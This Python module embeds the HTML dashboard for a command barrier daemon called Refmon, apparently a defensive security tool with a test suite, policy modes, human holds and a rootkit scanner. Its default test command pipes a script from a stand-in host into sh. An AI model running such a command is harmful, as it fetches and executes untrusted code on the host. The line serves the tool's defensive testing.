# ruff: noqa: E501
"""Clean, minimal light-theme web interface for the Refmon live barrier daemon.

Self-contained HTML/CSS/JS with zero external network assets so it runs offline on shared
cluster nodes and strictly displays privacy-safe post-Observe telemetry (`hmac:...` only).
"""

from __future__ import annotations

DASHBOARD_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Refmon Policy Monitor</title>
<style>
:root {
  --bg: #f6f8fa;
  --surface: #ffffff;
  --border: #d8dee4;
  --border-soft: #eaeef2;
  --text: #1f2328;
  --muted: #59636e;
  --allow-bg: #dafbe1;
  --allow-fg: #1a7f37;
  --hold-bg: #fff8c5;
  --hold-fg: #9a6700;
  --block-bg: #ffebe9;
  --block-fg: #cf222e;
  --neutral-bg: #eef1f4;
  --neutral-fg: #424a53;
  --primary: #0969da;
  --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
}
* { box-sizing: border-box; }
body {
  margin: 0;
  background: var(--bg);
  color: var(--text);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  font-size: 13.5px;
  line-height: 1.45;
}
.container {
  max-width: 1440px;
  margin: 0 auto;
  padding: 18px 22px 36px;
}
header {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 14px 18px;
  margin-bottom: 16px;
  display: flex;
  flex-wrap: wrap;
  justify-content: space-between;
  align-items: center;
  gap: 12px;
}
h1 { margin: 0; font-size: 18px; font-weight: 600; color: var(--text); }
.subtitle { color: var(--muted); font-size: 12px; font-family: var(--mono); margin-top: 2px; }
.summary-strip {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
}
.metric {
  border: 1px solid var(--border);
  background: #fafbfc;
  border-radius: 6px;
  padding: 6px 12px;
  min-width: 96px;
}
.metric .k { font-size: 11px; color: var(--muted); }
.metric .v { font-size: 15px; font-weight: 600; font-family: var(--mono); }

.top-grid {
  display: grid;
  grid-template-columns: 1.35fr 1fr 1fr;
  gap: 14px;
  margin-bottom: 16px;
}
@media (max-width: 1150px) {
  .top-grid { grid-template-columns: 1fr; }
}
.panel {
  background: var(--surface);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 14px 16px;
}
.panel h2 {
  margin: 0 0 10px 0;
  font-size: 14px;
  font-weight: 600;
  color: var(--text);
  border-bottom: 1px solid var(--border-soft);
  padding-bottom: 7px;
}
.muted { color: var(--muted); font-size: 12px; }
.mono { font-family: var(--mono); font-size: 12px; }

label {
  display: block;
  font-size: 12px;
  font-weight: 500;
  color: var(--muted);
  margin: 8px 0 3px;
}
input, select, textarea {
  width: 100%;
  background: #ffffff;
  color: var(--text);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 6px 8px;
  font-family: var(--mono);
  font-size: 12px;
}
textarea { min-height: 54px; resize: vertical; }

button {
  cursor: pointer;
  background: #f6f8fa;
  color: var(--text);
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 6px 10px;
  font-size: 12px;
  font-weight: 500;
}
button:hover { background: #eaeef2; }
button.primary {
  background: var(--primary);
  color: #ffffff;
  border-color: var(--primary);
}
button.primary:hover { background: #0858b9; }
button.active-mode {
  background: #1f2328;
  color: #ffffff;
  border-color: #1f2328;
}

.group-title {
  font-size: 11px;
  font-weight: 600;
  color: var(--muted);
  margin: 8px 0 4px;
  text-transform: uppercase;
  letter-spacing: 0.3px;
}
.btn-wrap {
  display: flex;
  flex-wrap: wrap;
  gap: 5px;
}
.btn-sm { padding: 4px 8px; font-size: 11.5px; }

.notice {
  margin-top: 8px;
  padding: 8px 10px;
  border-radius: 6px;
  border: 1px solid var(--border);
  background: #f6f8fa;
  font-size: 12px;
}

.tag {
  display: inline-block;
  padding: 1px 7px;
  border-radius: 12px;
  font-size: 11px;
  font-weight: 600;
  font-family: var(--mono);
}
.tag.allow, .tag.pass { background: var(--allow-bg); color: var(--allow-fg); }
.tag.hold { background: var(--hold-bg); color: var(--hold-fg); }
.tag.block, .tag.fail { background: var(--block-bg); color: var(--block-fg); }
.tag.neutral { background: var(--neutral-bg); color: var(--neutral-fg); }

.q-line { display: flex; flex-wrap: wrap; gap: 4px; margin-bottom: 4px; }
.q-chip {
  font-size: 11px;
  font-family: var(--mono);
  padding: 1px 6px;
  border-radius: 4px;
  border: 1px solid var(--border);
}
.q-chip.qfail { background: var(--block-bg); color: var(--block-fg); border-color: #ffcecb; }
.q-chip.qok { background: #f6f8fa; color: var(--muted); }

table {
  width: 100%;
  border-collapse: collapse;
  font-size: 12.5px;
}
th {
  text-align: left;
  font-weight: 600;
  color: var(--muted);
  background: #f6f8fa;
  border-bottom: 1px solid var(--border);
  padding: 8px 10px;
  font-size: 11.5px;
}
td {
  vertical-align: top;
  border-bottom: 1px solid var(--border-soft);
  padding: 9px 10px;
}
tr:hover td { background: #fafbfc; }

.kv-row {
  display: flex;
  justify-content: space-between;
  padding: 3px 0;
  border-bottom: 1px solid var(--border-soft);
  font-size: 12px;
}
.log-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 14px;
  margin-top: 16px;
}
@media (max-width: 980px) {
  .log-grid { grid-template-columns: 1fr; }
}
pre.logbox {
  margin: 0;
  background: #f6f8fa;
  border: 1px solid var(--border);
  border-radius: 6px;
  padding: 10px;
  font-family: var(--mono);
  font-size: 11.5px;
  max-height: 220px;
  overflow-y: auto;
  white-space: pre-wrap;
  word-break: break-all;
}
details summary {
  cursor: pointer;
  font-weight: 600;
  font-size: 13px;
  padding: 4px 0;
}
</style>
</head>
<body>
<div class="container">
  <header>
    <div>
      <h1>Refmon Live Security Barrier &amp; Policy Monitor</h1>
      <div class="subtitle" id="hdr-paths">Loading workspace...</div>
    </div>
    <div class="summary-strip">
      <div class="metric"><div class="k">Policy Signature</div><div class="v" id="m-sig">...</div></div>
      <div class="metric"><div class="k">Active Mode</div><div class="v" id="m-mode">BLOCK</div></div>
      <div class="metric"><div class="k">Analysis Checks</div><div class="v" id="m-eval">0 / 0</div></div>
      <div class="metric"><div class="k">Observed Events</div><div class="v" id="m-events">0</div></div>
      <div class="metric"><div class="k">Blocked</div><div class="v" id="m-blocked">0</div></div>
      <div class="metric"><div class="k">Pending Holds</div><div class="v" id="m-holds">0</div></div>
      <div class="metric"><div class="k">Quarantined</div><div class="v" id="m-quar">0</div></div>
      <div class="metric"><div class="k">Rootkit Scan</div><div class="v" id="m-rk">ALLOW</div></div>
    </div>
  </header>

  <div id="token-banner" class="notice" style="display:none; background:#fff8c5; border:1px solid #d4a72c; color:#734f00; margin-bottom:14px; padding:10px 14px; border-radius:6px;">
    <strong>API Token Required:</strong> The live barrier daemon requires authentication on shared cluster nodes.
    <div style="margin-top:6px; display:flex; flex-wrap:wrap; gap:8px; align-items:center;">
      <input id="token-input" placeholder="Paste API token from terminal or /tmp/refmon-live-*/api.token" style="flex:1; min-width:280px; font-family:var(--mono); padding:6px 9px; font-size:12px; border:1px solid #d4a72c; border-radius:4px;">
      <button class="btn-sm" onclick="saveToken()" style="background:#0969da; color:#fff; border:none; padding:6px 14px; cursor:pointer; border-radius:4px; font-weight:600;">Save &amp; Authenticate</button>
    </div>
  </div>

  <div class="top-grid">
    <!-- Panel 1: Attack & Control Suite -->
    <div class="panel">
      <div style="display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--border-soft); padding-bottom:7px; margin-bottom:8px;">
        <h2 style="border:none; padding:0; margin:0;">1. Attack &amp; Benign Test Suite</h2>
        <button class="primary" onclick="runFullSuite()">Run All 16 Scenarios</button>
      </div>
      <div id="preset-groups">Loading scenarios...</div>
      <div style="margin-top:10px; padding-top:8px; border-top:1px solid var(--border-soft); display:flex; gap:6px; align-items:center;">
        <span class="muted" style="white-space:nowrap;">Golden Scenario (S01-S50):</span>
        <input id="golden-id" value="S01" style="max-width:90px;">
        <button class="btn-sm" onclick="runGolden()">Replay</button>
      </div>
      <div id="suite-banner" class="notice" style="display:none;"></div>
    </div>

    <!-- Panel 2: Custom Command Barrier -->
    <div class="panel">
      <h2>2. Custom Command Barrier</h2>
      <div class="muted">Test any pasted or typed command against the active signed policy.</div>
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px;">
        <div>
          <label>Origin Source</label>
          <select id="cmd-origin">
            <option value="web">web (Browser paste)</option>
            <option value="mail">mail (Email copy)</option>
            <option value="agent_input">agent_input (AI tool)</option>
            <option value="inbound_request">inbound_request (HTTP)</option>
            <option value="download">download (File)</option>
            <option value="none">none (Typed locally)</option>
          </select>
        </div>
        <div>
          <label>Process Role</label>
          <select id="cmd-role">
            <option value="interactive_shell">interactive_shell</option>
            <option value="web_worker">web_worker</option>
            <option value="agent">agent</option>
            <option value="package_installer">package_installer</option>
          </select>
        </div>
      </div>
      <label>Command</label>
      <textarea id="cmd-text">curl -s http://bad.example.invalid/fix.sh | sh</textarea>
      <div style="margin-top:8px;">
        <button class="primary" onclick="submitCommand()" style="width:100%;">Check Command Through Barrier</button>
      </div>
      <div id="cmd-banner" class="notice" style="display:none;"></div>
    </div>

    <!-- Panel 3: Signed Policy, Holds, Quarantine & Rootkit -->
    <div class="panel">
      <h2>3. Signed Policy, Holds &amp; Host Integrity</h2>
      <div style="display:flex; gap:6px; margin-bottom:8px;">
        <button id="btn-mode-block" onclick="setMode('block')" style="flex:1;">Mode: Block</button>
        <button id="btn-mode-warn" onclick="setMode('warn')" style="flex:1;">Mode: Warn</button>
        <button id="btn-mode-observe" onclick="setMode('observe')" style="flex:1;">Mode: Observe</button>
      </div>
      <div id="policy-kv"></div>

      <div style="margin-top:10px;">
        <div style="display:flex; justify-content:space-between; align-items:center;">
          <strong style="font-size:12px;">Rootkit Scanner (6 Read-Only Engines)</strong>
          <button class="btn-sm" onclick="scanRootkit()">Scan Now</button>
        </div>
        <div id="rk-summary" class="muted mono" style="margin-top:3px;"></div>
      </div>

      <div style="margin-top:10px;">
        <strong style="font-size:12px;">Pending Holds (Human Decision)</strong>
        <div id="holds-list" class="muted" style="margin-top:3px;">None</div>
      </div>

      <div style="margin-top:8px;">
        <strong style="font-size:12px;">Quarantined Files</strong>
        <div id="quar-list" class="muted mono" style="margin-top:3px;">Empty</div>
      </div>
    </div>
  </div>

  <!-- Main Table: Live Incident & Analysis Ledger -->
  <div class="panel">
    <div style="display:flex; flex-wrap:wrap; justify-content:space-between; align-items:center; gap:10px; margin-bottom:10px;">
      <h2 style="border:none; padding:0; margin:0;">Live Pipeline Analysis &amp; Verdicts (Privacy-Safe Telemetry)</h2>
      <div class="btn-wrap">
        <button class="btn-sm" onclick="setFilter('all')" id="flt-all">All</button>
        <button class="btn-sm" onclick="setFilter('attack')" id="flt-attack">Attacks</button>
        <button class="btn-sm" onclick="setFilter('hold')" id="flt-hold">Holds</button>
        <button class="btn-sm" onclick="setFilter('benign')" id="flt-benign">Benign</button>
      </div>
    </div>
    <div style="overflow-x:auto;">
      <table>
        <thead>
          <tr>
            <th style="width:110px;">Story &amp; Time</th>
            <th style="width:200px;">Attack / Input Type</th>
            <th style="width:175px;">Verdict &amp; Check Status</th>
            <th style="width:210px;">3-Question Analysis</th>
            <th style="width:230px;">Evidence Math (nats)</th>
            <th>Safe Telemetry &amp; Plain-English Explanation</th>
          </tr>
        </thead>
        <tbody id="stories-tbody">
          <tr><td colspan="6" class="muted">No events analyzed yet. Click "Run All 16 Scenarios" above or run a test command.</td></tr>
        </tbody>
      </table>
    </div>
  </div>

  <!-- Live Logs & Contracts -->
  <div class="log-grid">
    <div class="panel">
      <h2>Live Audit Log (barrier.log)</h2>
      <pre class="logbox" id="barrier-log">Waiting...</pre>
    </div>
    <div class="panel">
      <h2>Post-Observe Event Ledger (events.jsonl — HMAC Fingerprints Only)</h2>
      <pre class="logbox" id="events-log">No observed events yet.</pre>
    </div>
  </div>

  <div class="panel" style="margin-top:14px;">
    <details>
      <summary>View Active Signed Role Contracts &amp; Protected Assets</summary>
      <div id="contracts-box" class="mono muted" style="margin-top:8px;"></div>
    </details>
  </div>
</div>

<script>
let currentFilter = 'all';
let presetsRendered = false;

// The API token comes from the URL fragment printed by `refmon serve` (a fragment is never sent
// to a server or in a Referer); it is kept for this tab only and can also be entered via the UI banner.
function getToken() {
  const fromHash = new URLSearchParams(location.hash.slice(1)).get('token');
  if (fromHash) {
    try { sessionStorage.setItem('refmonToken', fromHash); } catch (e) {}
    try { history.replaceState(null, '', location.pathname); } catch (e) {}
    return fromHash;
  }
  try {
    const s = sessionStorage.getItem('refmonToken');
    if (s) return s;
  } catch (e) {}
  const inp = document.getElementById('token-input');
  if (inp && inp.value.trim()) return inp.value.trim();
  return '';
}

function saveToken() {
  const inp = document.getElementById('token-input');
  const val = (inp ? inp.value : '').trim();
  if (val) {
    try { sessionStorage.setItem('refmonToken', val); } catch (e) {}
    const tb = document.getElementById('token-banner');
    if (tb) tb.style.display = 'none';
    refresh();
  }
}

async function api(path, body) {
  const token = getToken();
  const headers = {'X-Refmon-Token': token};
  const opts = body !== undefined
    ? {method: 'POST', headers: {...headers, 'Content-Type': 'application/json'}, body: JSON.stringify(body)}
    : {method: 'GET', headers};
  const r = await fetch(path, opts);
  if (r.status === 401) {
    const tb = document.getElementById('token-banner');
    if (tb) tb.style.display = 'block';
    throw new Error('API token missing or invalid: paste token in banner above or open URL printed by refmon serve');
  }
  return await r.json();
}

function esc(val) {
  return String(val ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function setFilter(f) {
  currentFilter = f;
  refresh();
}

function renderPresets(presets) {
  if (presetsRendered || !presets || !presets.length) return;
  presetsRendered = true;
  const groups = {};
  for (const p of presets) {
    if (!groups[p.group]) groups[p.group] = [];
    groups[p.group].push(p);
  }
  const box = document.getElementById('preset-groups');
  box.innerHTML = Object.entries(groups).map(([gName, items]) => `
    <div class="group-title">${esc(gName)}</div>
    <div class="btn-wrap">
      ${items.map(it => `<button class="btn-sm" onclick="runPreset('${esc(it.id)}')">${esc(it.label)}</button>`).join('')}
    </div>
  `).join('');
}

async function runPreset(name) {
  const b = document.getElementById('suite-banner');
  b.style.display = 'block';
  b.className = 'notice';
  b.style.background = '';
  b.style.color = '';
  b.textContent = `Running scenario: ${name}...`;
  try {
    const res = await api('/api/preset', {name});
    if (res.error) {
      b.style.background = 'var(--block-bg)';
      b.style.color = 'var(--block-fg)';
      b.innerHTML = `<strong>Error in ${esc(name)}:</strong> ${esc(res.error)}`;
    } else {
      const match = res.expected ? (res.decision === res.expected ? 'PASS' : 'MISMATCH') : '';
      b.style.background = match === 'PASS' ? 'var(--allow-bg)' : (match === 'MISMATCH' ? 'var(--block-bg)' : '');
      b.style.color = match === 'PASS' ? 'var(--allow-fg)' : (match === 'MISMATCH' ? 'var(--block-fg)' : '');
      b.innerHTML = `<strong>${esc(res.attack_type || name)}</strong> &rarr; Verdict: <strong>${esc(res.decision).toUpperCase()}</strong> `
        + (match ? `(Expected ${esc(res.expected).toUpperCase()}: <strong>${match}</strong>) ` : '')
        + `| L = ${esc(res.log_odds)} nats. ${esc(res.note || '')}`;
    }
  } catch (err) {
    b.style.background = 'var(--block-bg)';
    b.style.color = 'var(--block-fg)';
    b.innerHTML = `<strong>Error:</strong> ${esc(err.message || String(err))}`;
  }
  await refresh();
}

async function runFullSuite() {
  const b = document.getElementById('suite-banner');
  b.style.display = 'block';
  b.className = 'notice';
  b.style.background = '';
  b.style.color = '';
  b.textContent = 'Running all 16 attack & benign scenarios...';
  try {
    const res = await api('/api/run_suite', {});
    if (res.error) {
      b.style.background = 'var(--block-bg)';
      b.style.color = 'var(--block-fg)';
      b.innerHTML = `<strong>Suite Error:</strong> ${esc(res.error)}`;
    } else {
      b.style.background = res.failed === 0 ? 'var(--allow-bg)' : 'var(--hold-bg)';
      b.style.color = res.failed === 0 ? 'var(--allow-fg)' : 'var(--hold-fg)';
      b.innerHTML = `<strong>Suite Complete:</strong> ${res.passed} / ${res.total} scenarios matched expected policy verdicts `
        + `(${res.failed} mismatches). Inspect every row in the table below.`;
    }
  } catch (err) {
    b.style.background = 'var(--block-bg)';
    b.style.color = 'var(--block-fg)';
    b.innerHTML = `<strong>Error:</strong> ${esc(err.message || String(err))}`;
  }
  await refresh();
}

async function runGolden() {
  const scenario = document.getElementById('golden-id').value.trim();
  const b = document.getElementById('suite-banner');
  b.style.display = 'block';
  b.className = 'notice';
  b.style.background = '';
  b.style.color = '';
  b.textContent = `Replaying golden scenario ${scenario}...`;
  try {
    const res = await api('/api/golden', {scenario});
    if (res.error) {
      b.style.background = 'var(--block-bg)';
      b.style.color = 'var(--block-fg)';
      b.textContent = res.error;
    } else {
      b.style.background = res.passed ? 'var(--allow-bg)' : 'var(--block-bg)';
      b.style.color = res.passed ? 'var(--allow-fg)' : 'var(--block-fg)';
      b.innerHTML = `<strong>${esc(res.scenario)}</strong> &rarr; ${esc(res.decision).toUpperCase()} `
        + `(expected ${esc(res.expected).toUpperCase()}, check=${res.passed ? 'PASS' : 'MISMATCH'}, L=${res.log_odds} nats)`;
    }
  } catch (err) {
    b.style.background = 'var(--block-bg)';
    b.style.color = 'var(--block-fg)';
    b.textContent = err.message || String(err);
  }
  await refresh();
}

async function submitCommand() {
  const origin = document.getElementById('cmd-origin').value;
  const role = document.getElementById('cmd-role').value;
  const command = document.getElementById('cmd-text').value;
  const b = document.getElementById('cmd-banner');
  b.style.display = 'block';
  b.textContent = 'Checking command...';
  try {
    const res = await api('/api/guard', {command, origin, role, execute: true});
    if (res.error) {
      b.innerHTML = `<strong>Error:</strong> ${esc(res.error)}`;
    } else {
      b.innerHTML = `<strong>Verdict: ${esc(res.decision).toUpperCase()}</strong> `
        + `(L = ${esc(res.log_odds)} nats, executed = ${esc(res.executed)})<br>`
        + `${esc(res.explanation || '')}`
        + (res.output ? `<br><span class="mono">stdout: ${esc(res.output)}</span>` : '');
    }
  } catch (err) {
    b.innerHTML = `<strong>Error:</strong> ${esc(err.message || String(err))}`;
  }
  await refresh();
}

async function resolveHold(hold_id, platform, answer) {
  try {
    await api('/api/hold', {hold_id, platform, answer});
  } catch (e) {
    alert(e.message || String(e));
  }
  await refresh();
}

async function setMode(mode) {
  try {
    await api('/api/mode', {mode});
  } catch (e) {
    alert(e.message || String(e));
  }
  await refresh();
}

async function scanRootkit() {
  try {
    await api('/api/rootkit', {});
  } catch (e) {
    alert(e.message || String(e));
  }
  await refresh();
}

async function refresh() {
  try {
    const st = await api('/api/state');
    const tb = document.getElementById('token-banner');
    if (tb) tb.style.display = 'none';
    renderPresets(st.presets);

    document.getElementById('hdr-paths').textContent =
      `Workspace: ${st.sandbox_dir}  |  Signed Policy: ${st.policy_path}`;
    document.getElementById('m-sig').textContent = st.policy.signature_ok ? 'VERIFIED' : 'UNSIGNED';
    document.getElementById('m-mode').textContent = st.policy.mode.toUpperCase();
    document.getElementById('m-eval').textContent =
      st.counts.evaluated ? `${st.counts.eval_passed}/${st.counts.evaluated} PASS` : '—';
    document.getElementById('m-events').textContent = st.counts.events;
    document.getElementById('m-blocked').textContent = st.counts.blocked;
    document.getElementById('m-holds').textContent = st.counts.pending_holds;
    document.getElementById('m-quar').textContent = st.quarantined.length;
    document.getElementById('m-rk').textContent = st.rootkit.calculus_decision.toUpperCase();

    for (const m of ['block', 'warn', 'observe']) {
      const btn = document.getElementById('btn-mode-' + m);
      if (btn) btn.className = (st.policy.mode === m) ? 'active-mode' : '';
    }
    for (const f of ['all', 'attack', 'hold', 'benign']) {
      const fb = document.getElementById('flt-' + f);
      if (fb) fb.className = (currentFilter === f) ? 'btn-sm active-mode' : 'btn-sm';
    }

    document.getElementById('policy-kv').innerHTML = `
      <div class="kv-row"><span>Ed25519 Digest</span><span class="mono">${esc(st.policy.digest.slice(0, 20))}...</span></div>
      <div class="kv-row"><span>Prior / Hold / Block (nats)</span><span class="mono">${st.policy.prior_lo} / ${st.policy.hold_thr} / ${st.policy.block_thr}</span></div>
      <div class="kv-row"><span>Canaries</span><span class="mono">${esc(st.policy.canaries.join(', '))}</span></div>
    `;

    const rk = st.rootkit;
    document.getElementById('rk-summary').innerHTML =
      `Decision: <strong>${esc(rk.calculus_decision).toUpperCase()}</strong> | `
      + `L=${rk.log_odds} nats | findings=${rk.findings.length} | `
      + `modules=${rk.kernel_modules_checked}, procs=${rk.own_processes_inspected}`;

    const hbox = document.getElementById('holds-list');
    if (!st.holds.length) {
      hbox.textContent = 'No pending holds.';
    } else {
      hbox.innerHTML = st.holds.map(h => `
        <div style="margin-top:4px; padding:6px; border:1px solid var(--border); border-radius:6px;">
          <span class="mono"><strong>${esc(h.hold_id)}</strong> (${esc(h.platform)}, ${esc(h.story_id)})</span>
          <div style="margin-top:4px; display:flex; gap:5px;">
            <button class="btn-sm" onclick="resolveHold('${esc(h.hold_id)}','${esc(h.platform)}','${h.platform === 'server' ? 'confirm' : 'stop'}')">Stop &amp; Block</button>
            <button class="btn-sm" onclick="resolveHold('${esc(h.hold_id)}','${esc(h.platform)}','${h.platform === 'server' ? 'release' : 'continue'}')">Release</button>
          </div>
        </div>
      `).join('');
    }

    const qbox = document.getElementById('quar-list');
    qbox.textContent = st.quarantined.length ? st.quarantined.join(', ') : 'Empty';

    // Filter stories
    const filtered = st.stories.filter(s => {
      if (currentFilter === 'attack') return s.category === 'attack' || s.category === 'malicious' || s.decision === 'block';
      if (currentFilter === 'hold') return s.decision === 'hold' || s.category === 'borderline';
      if (currentFilter === 'benign') return s.category === 'benign' || s.decision === 'allow';
      return true;
    });

    const tbody = document.getElementById('stories-tbody');
    if (!filtered.length) {
      tbody.innerHTML = '<tr><td colspan="6" class="muted">No stories match the current filter.</td></tr>';
    } else {
      tbody.innerHTML = filtered.map(s => {
        const q = s.failed;
        let checkBadge = '<span class="tag neutral">Live Input</span>';
        if (s.analysis_passed === true) {
          checkBadge = `<span class="tag pass">Check: PASS (exp ${esc(s.expected).toUpperCase()})</span>`;
        } else if (s.analysis_passed === false) {
          checkBadge = `<span class="tag fail">Check: MISMATCH (exp ${esc(s.expected).toUpperCase()})</span>`;
        }
        const contribs = (s.contributions || []).map(c => `${c.signal} (${c.nats >= 0 ? '+' : ''}${c.nats})`).join(', ');
        return `
          <tr>
            <td class="mono">
              <strong>${esc(s.story_id)}</strong><br>
              <span class="muted">${esc(s.ts)} UTC</span><br>
              <span class="muted">${esc(s.platform)} · ${s.events} ev</span>
            </td>
            <td>
              <strong>${esc(s.attack_type)}</strong><br>
              <span class="tag neutral" style="margin-top:3px;">${esc(s.category)}</span>
            </td>
            <td>
              <span class="tag ${esc(s.decision)}">${esc(s.decision).toUpperCase()}</span>
              ${s.override ? `<span class="tag block">OVR:${esc(s.override)}</span>` : ''}
              <div style="margin-top:4px;">${checkBadge}</div>
              <div class="muted" style="margin-top:3px;">${esc(s.enforcement)}</div>
            </td>
            <td>
              <div class="q-line">
                <span class="q-chip ${q.origin ? 'qfail' : 'qok'}">Origin: ${q.origin ? 'FAIL' : 'OK'}</span>
                <span class="q-chip ${q.contract ? 'qfail' : 'qok'}">Contract: ${q.contract ? 'FAIL' : 'OK'}</span>
                <span class="q-chip ${q.effect ? 'qfail' : 'qok'}">Effect: ${q.effect ? 'FAIL' : 'OK'}</span>
              </div>
              <div class="muted mono">Failed: ${s.fail_count}/3 · 3/2/1 rule: ${esc(s.rule_decision)}</div>
              ${s.contract_gate ? '<div class="muted mono">Contract gate: active (capped at HOLD)</div>' : ''}
            </td>
            <td class="mono">
              <div><strong>L = ${s.log_odds} nats</strong> <span class="muted">(L0 = ${s.prior_log_odds})</span></div>
              <div class="muted">Threshold crossed: ${esc(s.threshold_crossed)}</div>
              ${contribs ? `<div class="muted" style="margin-top:3px;">${esc(contribs)}</div>` : ''}
            </td>
            <td>
              <div>${esc(s.explanation)}</div>
              <div class="muted mono" style="margin-top:4px;">
                roles=[${esc(s.roles.join(', '))}] · events=[${esc(s.event_types.join(' -> '))}]
                ${s.actions_taken.length ? ` · actions=[${esc(s.actions_taken.join(', '))}]` : ''}
                ${s.tactics.length ? `<br>MITRE ATT&amp;CK: ${esc(s.tactics.join(', '))}` : ''}
                ${s.fingerprints.length ? `<br>HMAC digests: ${esc(s.fingerprints.join(', '))}` : ''}
              </div>
            </td>
          </tr>
        `;
      }).join('');
    }

    document.getElementById('barrier-log').textContent = st.barrier_log.join('\\n') || 'Ready.';
    document.getElementById('events-log').textContent = st.events_log.join('\\n') || 'No events yet.';
    document.getElementById('contracts-box').innerHTML =
      `Protected assets: ${esc(st.policy.protected_assets.join(', '))}<br><br>` +
      Object.entries(st.policy.contracts)
        .map(([r, spec]) => `<div><strong>${esc(r)}</strong>: ${esc(spec)}</div>`)
        .join('');
  } catch (e) {
    // Transient reload error ignored
  }
}

refresh();
setInterval(refresh, 1500);
</script>
</body>
</html>
"""
